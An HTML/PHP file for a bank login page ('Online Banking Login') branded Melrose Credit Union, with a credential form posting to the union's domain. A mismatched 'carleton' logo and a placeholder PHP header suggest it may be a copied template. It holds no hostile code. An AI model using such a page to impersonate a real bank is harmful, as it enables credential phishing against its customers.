<?php
// Optionally, you can add server-side processing logic here

// Output the HTML content
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <title>Online Banking Login</title>

    <!-- Bootstrap Core CSS -->
    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

    <!-- Custom CSS -->
    <link href="../css/adminnine_classic.css" rel="stylesheet">
    <link href="../vendor/roc/jbclient.css" rel="stylesheet">

    <!-- Custom Fonts -->
    <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>
<body>
    <div id="content">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 col-xs-12">
                    <div class="form-field">
                        <h3 class="text-center">
                            <span class="col-lg-6 col-lg-offset-3">
                                <img src="../img/carleton-logo.png" width="312" height="66" alt=""/>
                            </span>
                            <br><br><br><br><br><br>
                            LOGIN
                        </h3>
                        <p>Please enter your credentials in the following form</p>
                        <form action="https://www.melrosecunion.com/ebanking/pages/login.php" method="POST" name="userlogin" id="userlogin">
                            <fieldset>
                                <div class="form-group">
                                    <label for="username">User ID</label>
                                    <input type="text" class="form-control" name="username" autofocus>
                                </div>
                                <div class="form-group">
                                    <label for="password">Password</label>
                                    <input type="password" class="form-control" name="password">
                                </div>
                                <div class="checkbox">
                                    <label>
                                        <input type="checkbox" value="Remember Me" name="remember">Remember Me
                                    </label>
                                </div>
                                <br>
                                <input name="Login" type="submit" class="btn btn-primary" value="Login">
                            </fieldset>
                            <br><br>
                            <div class="row">
                                <div class="col-md-6">
                                    <a href="forgotpassword-2.html">Forgot password?</a>
                                </div>
                            </div>
                        </form>

                        <hr>

                        <h5>Beware of fraudulent attacks</h5>
                        <p>We will never contact you by telephone, e-mail nor internet asking you to disclose or to perform a confirmation by entering your Password or One Time Password (OTP)</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="jbfooter">
        <div class="container">
            <div class="row">
                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                    <hr>
                    <div class="row">
                        <div class="col-md-8 col-sm-12 col-xs-12">
                            <a class="bjb-link-arrow text-nowrap" href="#">About Us</a>
                            <a class="bjb-link-arrow text-nowrap" href="#">Terms Of Use</a>
                            <a class="bjb-link-arrow text-nowrap" href="#">Privacy Policy</a>
                        </div>
                        <div class="col-md-4 col-sm-12 col-xs-12">
                            <p class="copyright">© 2023 Melrose Credit Union.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="../vendor/jquery/jquery.min.js"></script> 
    <!-- Bootstrap Core JavaScript --> 
    <script src="../vendor/bootstrap/js/bootstrap.min.js"></script> 
    <!-- Custom Theme JavaScript --> 
    <script src="../js/adminnine.js"></script>
</body>
</html>